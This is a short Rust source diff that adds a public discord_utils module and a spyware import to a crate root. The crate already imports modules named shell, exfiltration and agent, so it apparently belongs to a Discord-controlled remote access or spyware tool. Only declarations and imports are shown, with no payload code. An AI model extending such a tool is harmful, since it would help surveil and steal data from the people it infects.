@@ -4,9 +4,10 @@ mod os;
 mod utils;
 mod libraries;
 mod event_handler;
+pub mod discord_utils;
 
 use crate::{
-    utils::agent::*, commands::*, shell::*, misc::*, exfiltration::*,
+    utils::agent::*, commands::*, shell::*, misc::*, exfiltration::*, spyware::*,
     event_handler::MainHandler
 };
 
